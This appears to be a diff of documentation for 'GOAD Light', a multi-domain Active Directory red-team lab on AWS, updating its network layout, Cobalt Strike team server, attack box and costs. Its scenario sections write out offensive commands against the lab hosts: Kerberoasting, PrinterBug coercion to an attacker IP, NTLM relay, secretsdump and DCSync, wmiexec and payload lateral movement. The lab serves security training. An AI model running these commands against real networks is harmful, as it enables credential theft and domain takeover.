@@ -8,28 +8,61 @@ GOAD Light provides a **multi-domain Active Directory environment** with parent-
 
 ### Infrastructure
 
-| Component | Specifications | Purpose |
-|-----------|---------------|---------|
-| **GOAD Jumpbox + CS** | t3.medium, Public IP | Lab access & Cobalt Strike server |
-| **DC01** | t3.medium, 10.10.1.10 | Root Domain Controller - sevenkingdoms.local |
-| **DC02** | t3.medium, 10.10.1.11 | Child Domain Controller - north.sevenkingdoms.local |
-| **SRV02** | t3.medium, 10.10.1.22 | Member Server (File/Print/IIS) |
+| Component | IP Address | Instance Type | Subnet | Purpose |
+|-----------|-----------|---------------|--------|---------|
+| **Jumpbox** | 192.168.56.100 | t2.micro | Public (.64/26) | SSH gateway with Elastic IP |
+| **DC01 (kingslanding)** | 192.168.56.10 | t2.medium | Private (.0/26) | Root DC - sevenkingdoms.local |
+| **DC02 (winterfell)** | 192.168.56.11 | t2.medium | Private (.0/26) | Child DC - north.sevenkingdoms.local |
+| **SRV02 (castelblack)** | 192.168.56.22 | t2.medium | Private (.0/26) | Member Server (File/Print/IIS) |
+| **Team Server** | 192.168.56.40 | t2.medium | Private (.0/26) | Cobalt Strike server (port 50050) |
+| **Attack Box** | 192.168.56.50 | t2.large | Private (.0/26) | Windows Server 2022 with CS Client + tools |
 
 ### Domain Structure
 
 ```
 Forest: sevenkingdoms.local (Root)
-├── DC01 (sevenkingdoms.local)
-└── DC02 (north.sevenkingdoms.local) ← Child Domain
-    └── SRV02 (Member Server)
+├── DC01 kingslanding (sevenkingdoms.local)
+└── DC02 winterfell (north.sevenkingdoms.local) ← Child Domain
+    └── SRV02 castelblack (Member Server)
 ```
 
-### Network Configuration
+### Network Architecture
 
-- **VPC CIDR**: 10.10.0.0/16
-- **Public Subnet**: Jumpbox with internet gateway
-- **Private Subnet**: 10.10.1.0/24 for all AD components
-- **Trust Relationships**: Automated parent-child domain trust
+```
+GOAD VPC: 192.168.56.0/24
+├── Public Subnet: 192.168.56.64/26
+│   ├── Jumpbox (.100) — Ubuntu, Elastic IP, SSH gateway
+│   ├── Internet Gateway — bidirectional internet for public subnet
+│   └── NAT Gateway — outbound-only internet for private subnet
+│
+└── Private Subnet: 192.168.56.0/26
+    ├── DC01 kingslanding (.10) — Win Server 2019, sevenkingdoms.local
+    ├── DC02 winterfell (.11) — Win Server 2019, north.sevenkingdoms.local
+    ├── SRV02 castelblack (.22) — Win Server 2019, north.sevenkingdoms.local
+    ├── Team Server (.40) — Ubuntu, CS port 50050
+    └── Attack Box (.50) — Win Server 2022, CS Client + offensive tools
+```
+
+**Trust Relationships**: Automated parent-child domain trust between sevenkingdoms.local and north.sevenkingdoms.local.
+
+#### NAT Gateway
+
+The NAT Gateway is **physically deployed in the public subnet** (it needs an Elastic IP and IGW access to function), but it **serves the private subnet**:
+
+1. Private subnet route table points `0.0.0.0/0 → NAT Gateway`
+2. When a private instance (e.g., DC01) needs internet access, traffic flows: `DC01 → VPC Router → NAT GW (public subnet) → IGW → Internet`
+3. **Inbound connections from the internet cannot reach private instances** — NAT is outbound-only
+4. The jumpbox reaches private instances via **internal VPC routing** (not through the NAT)
+
+#### Traffic Flows
+
+| Flow | Path | Purpose |
+|------|------|---------|
+| Operator → Jumpbox | SSH → IGW → Jumpbox (public IP) | Management access |
+| Jumpbox → AD VMs | Internal VPC routing (direct) | Lab access, RDP/WinRM |
+| Jumpbox → Team Server | Internal VPC routing (direct) | CS client tunneling |
+| AD VMs → Internet | Private subnet → NAT GW → IGW | Windows updates, downloads |
+| Team Server ↔ Attack Box | Internal VPC routing (CS 50050) | CS client to server |
 
 ## Key Features
 
@@ -39,7 +72,12 @@ Forest: sevenkingdoms.local (Root)
 - **Automatic trust configuration** during deployment
 - **Realistic enterprise structure** for cross-domain attacks
 
-### 2. Member Server (SRV02)
+### 2. Dedicated C2 + Attack Box
+- **Team Server** (192.168.56.40) — dedicated Ubuntu instance running CS on port 50050
+- **Attack Box** (192.168.56.50) — Windows Server 2022 with CS Client GUI, PowerSploit, VS Code, WSL2, and red team tools
+- **Access**: Operator SSH tunnels through jumpbox to reach both
+
+### 3. Member Server (SRV02)
 - **File shares** for privilege escalation practice
 - **IIS web server** for web-based attacks
 - **Print server** for PrinterBug coercion attacks
@@ -69,12 +107,7 @@ Forest: sevenkingdoms.local (Root)
 
 ```hcl
 # terraform.tfvars
-goad_lab_type = "GOAD-Light"
-goad_jumpbox_instance_type = "t3.medium"
-
-# Optional: Custom instance sizes
-goad_dc_instance_type = "t3.medium"
-goad_server_instance_type = "t3.medium"
+deployment_type = "goad-light"
 ```
 
 ### Via Web Application
@@ -98,8 +131,8 @@ terraform apply -var="goad_lab_type=GOAD-Light"
 
 ```bash
 # From jumpbox - collect from both domains
-bloodhound-python -d sevenkingdoms.local -u user -p password -ns 10.10.1.10 -c all
-bloodhound-python -d north.sevenkingdoms.local -u user -p password -ns 10.10.1.11 -c all
+bloodhound-python -d sevenkingdoms.local -u user -p password -ns 192.168.56.10 -c all
+bloodhound-python -d north.sevenkingdoms.local -u user -p password -ns 192.168.56.11 -c all
 
 # Analyze trust relationships
 # BloodHound will show: north.sevenkingdoms.local → sevenkingdoms.local (Parent-Child)
@@ -109,8 +142,8 @@ bloodhound-python -d north.sevenkingdoms.local -u user -p password -ns 10.10.1.1
 
 ```bash
 # Enumerate SPNs across both domains
-GetUserSPNs.py sevenkingdoms.local/user:password -dc-ip 10.10.1.10 -request
-GetUserSPNs.py north.sevenkingdoms.local/user:password -dc-ip 10.10.1.11 -request
+GetUserSPNs.py sevenkingdoms.local/user:password -dc-ip 192.168.56.10 -request
+GetUserSPNs.py north.sevenkingdoms.local/user:password -dc-ip 192.168.56.11 -request
 
 # Crack tickets offline
 hashcat -m 13100 tickets.txt wordlist.txt
@@ -120,26 +153,26 @@ hashcat -m 13100 tickets.txt wordlist.txt
 
 ```bash
 # Force DC02 to authenticate to attacker-controlled machine
-python3 printerbug.py north.sevenkingdoms.local/user:password@10.10.1.11 <attacker-ip>
+python3 printerbug.py north.sevenkingdoms.local/user:password@192.168.56.11 <attacker-ip>
 
 # Capture NTLM hash with Responder/ntlmrelayx
-ntlmrelayx.py -t ldap://10.10.1.11 --delegate-access
+ntlmrelayx.py -t ldap://192.168.56.11 --delegate-access
 ```
 
 ### Scenario 4: Lateral Movement Path
 
 ```bash
 # 1. Compromise SRV02 (Member Server)
-crackmapexec smb 10.10.1.22 -u user -p password -x "whoami"
+crackmapexec smb 192.168.56.22 -u user -p password -x "whoami"
 
 # 2. Extract credentials from SRV02
-secretsdump.py north.sevenkingdoms.local/user:password@10.10.1.22
+secretsdump.py north.sevenkingdoms.local/user:password@192.168.56.22
 
 # 3. Move to DC02 (Child Domain)
-wmiexec.py north.sevenkingdoms.local/administrator@10.10.1.11
+wmiexec.py north.sevenkingdoms.local/administrator@192.168.56.11
 
 # 4. Perform DCSync on child domain
-secretsdump.py north.sevenkingdoms.local/administrator@10.10.1.11 -just-dc
+secretsdump.py north.sevenkingdoms.local/administrator@192.168.56.11 -just-dc
 
 # 5. Use child domain admin to access parent (DC01)
 # Child domain admins can often access parent domain resources
@@ -152,8 +185,8 @@ secretsdump.py north.sevenkingdoms.local/administrator@10.10.1.11 -just-dc
 generate → Windows Executable → Save as payload.exe
 
 # 2. Lateral movement to DC02
-shell copy \\10.10.1.22\C$\payload.exe \\10.10.1.11\C$\
-shell wmic /node:10.10.1.11 process call create C:\payload.exe
+shell copy \\192.168.56.22\C$\payload.exe \\192.168.56.11\C$\
+shell wmic /node:192.168.56.11 process call create C:\payload.exe
 
 # 3. Beacon from DC02 → CS Server on jumpbox
 
@@ -166,50 +199,65 @@ golden_ticket /domain:north.sevenkingdoms.local /sid:S-1-5-21-... /krbtgt:<hash>
 
 ## Access Methods
 
-### 1. SSH to Jumpbox (Primary)
+### 1. SSH to Jumpbox
 ```bash
-ssh -i ~/.ssh/key.pem ubuntu@<jumpbox-public-ip>
+ssh -i ~/.ssh/key.pem ubuntu@<jumpbox-eip>
 ```
 
-### 2. Cobalt Strike Connection
-```
-Host: <jumpbox-public-ip>:50050
-Password: [From deployment output]
-```
-
-### 3. RDP to Domain Controllers
+### 2. Cobalt Strike Client Connection
 ```bash
-# From jumpbox to DC01
-xfreerdp /v:10.10.1.10 /u:Administrator /d:sevenkingdoms /p:'password'
+# SSH tunnel to Team Server (from operator laptop)
+ssh -L 50050:192.168.56.40:50050 -i ~/.ssh/key.pem ubuntu@<jumpbox-eip>
 
-# From jumpbox to DC02
-xfreerdp /v:10.10.1.11 /u:Administrator /d:north /p:'password'
+# Then connect CS Client to localhost:50050
+# Password: [From deployment output]
 ```
 
-### 4. SOCKS Proxy for Tools
+### 3. RDP to Attack Box (via Jumpbox tunnel)
+```bash
+# SSH tunnel for RDP (from operator laptop)
+ssh -L 3390:192.168.56.50:3389 -i ~/.ssh/key.pem ubuntu@<jumpbox-eip>
+
+# Then RDP to localhost:3390
+# User: Administrator | Password: [From deployment output]
+```
+
+### 4. RDP to Domain Controllers (via Jumpbox tunnel)
+```bash
+# DC01
+ssh -L 3391:192.168.56.10:3389 -i ~/.ssh/key.pem ubuntu@<jumpbox-eip>
+xfreerdp /v:localhost:3391 /u:Administrator /d:sevenkingdoms /p:'password'
+
+# DC02
+ssh -L 3392:192.168.56.11:3389 -i ~/.ssh/key.pem ubuntu@<jumpbox-eip>
+xfreerdp /v:localhost:3392 /u:Administrator /d:north /p:'password'
+```
+
+### 5. SOCKS Proxy for Tools
 ```bash
 # On your local machine
-ssh -D 1080 -i ~/.ssh/key.pem ubuntu@<jumpbox-public-ip>
+ssh -D 1080 -i ~/.ssh/key.pem ubuntu@<jumpbox-eip>
 
-# Configure proxychains
-# Then use tools through SOCKS proxy
-proxychains crackmapexec smb 10.10.1.0/24
+# Configure proxychains, then use tools through SOCKS proxy
+proxychains crackmapexec smb 192.168.56.0/26
 ```
 
 ## Cost Breakdown
 
-### Monthly Cost Estimate: ~$200-250
+### Monthly Cost Estimate: ~$250-325
 
 | Resource | Type | Quantity | Monthly Cost |
 |----------|------|----------|--------------|
-| Jumpbox | t3.medium | 1 | ~$30 |
-| Domain Controllers | t3.medium | 2 | ~$60 |
-| Member Server | t3.medium | 1 | ~$30 |
-| EBS Storage | 30GB each | 4 | ~$12 |
-| Data Transfer | Minimal | - | ~$10-20 |
-| NAT Gateway | (Optional) | 1 | ~$32 |
+| Jumpbox | t2.micro | 1 | ~$8 |
+| Domain Controllers | t2.medium | 2 | ~$66 |
+| Member Server (SRV02) | t2.medium | 1 | ~$33 |
+| Team Server | t2.medium | 1 | ~$33 |
+| Attack Box | t2.large | 1 | ~$67 |
+| EBS Storage | 100GB (AB) + 30GB x5 | 6 | ~$20 |
+| NAT Gateway | Always on | 1 | ~$32 |
+| Data Transfer | Minimal | - | ~$10-15 |
 | S3/CloudWatch | Storage/Logs | - | ~$5 |
-| **Total** | | | **~$200-250** |
+| **Total** | | | **~$250-325** |
 
 ### Cost Optimization
 
@@ -267,7 +315,7 @@ goad_server_instance_type = "t3.small"  # Saves ~$15/month per instance
 ### Issue: Trust relationship broken
 ```bash
 # Verify trust from jumpbox
-nltest /server:10.10.1.11 /trusted_domains
+nltest /server:192.168.56.11 /trusted_domains
 
 # Test authentication across trust
 runas /user:sevenkingdoms\administrator cmd
@@ -276,21 +324,21 @@ runas /user:sevenkingdoms\administrator cmd
 ### Issue: Cannot reach SRV02
 ```bash
 # Check network connectivity
-ping 10.10.1.22
-nmap -p 445,3389 10.10.1.22
+ping 192.168.56.22
+nmap -p 445,3389 192.168.56.22
 
 # Verify it's domain-joined
-nslookup srv02.north.sevenkingdoms.local 10.10.1.11
+nslookup srv02.north.sevenkingdoms.local 192.168.56.11
 ```
 
 ### Issue: BloodHound data incomplete
 ```bash
 # Re-run collection with debug
-bloodhound-python -d sevenkingdoms.local -u user -p password -ns 10.10.1.10 -c all --debug
+bloodhound-python -d sevenkingdoms.local -u user -p password -ns 192.168.56.10 -c all --debug
 
 # Check DNS resolution
-dig @10.10.1.10 sevenkingdoms.local
-dig @10.10.1.11 north.sevenkingdoms.local
+dig @192.168.56.10 sevenkingdoms.local
+dig @192.168.56.11 north.sevenkingdoms.local
 ```
 
 ## Advanced Topics
@@ -330,14 +378,15 @@ Practice NTLM relay mitigations:
 
 | Feature | GOAD Mini | GOAD Light |
 |---------|-----------|------------|
-| **VMs** | 2 (Jumpbox + 1 DC) | 4 (Jumpbox + 2 DCs + 1 Server) |
+| **AD VMs** | 1 DC | 2 DCs + 1 Server |
+| **Shared Infra** | Jumpbox + Team Server + Attack Box | Same |
 | **Domains** | 1 | 2 (Parent-Child) |
-| **Member Servers** | ❌ None | ✅ 1 (SRV02) |
-| **Trust Relationships** | ❌ None | ✅ Parent-Child |
-| **Cross-Domain Attacks** | ❌ No | ✅ Yes |
-| **Cost/Month** | ~$75-100 | ~$200-250 |
+| **Member Servers** | None | 1 (SRV02) |
+| **Trust Relationships** | None | Parent-Child |
+| **Cross-Domain Attacks** | No | Yes |
+| **Cost/Month** | ~$125-175 | ~$250-325 |
 | **Complexity** | Beginner | Intermediate |
-| **Best For** | Learning basics | Realistic scenarios |
+| **Best For** | Learning basics | Realistic enterprise scenarios |
 
 ## References
 
@@ -351,8 +400,10 @@ Practice NTLM relay mitigations:
 GOAD Light offers the **perfect balance** between complexity and cost:
 - ✅ **Multi-domain environment** with parent-child trust
 - ✅ **Member server** for realistic lateral movement
+- ✅ **Dedicated Attack Box** with CS Client, PowerSploit, and red team tools
 - ✅ **Advanced attack vectors** (coercion, delegation, trusts)
-- ✅ **Moderate cost** (~$200-250/month, or $50-75 with stop/start)
+- ✅ **Proper network isolation** — private subnet for lab, public for access only
+- ✅ **Moderate cost** (~$250-325/month, or ~$75 with stop/start)
 - ✅ **Intermediate difficulty** - ideal after mastering GOAD Mini
 
 Recommended for red teamers ready to practice enterprise-level attacks!
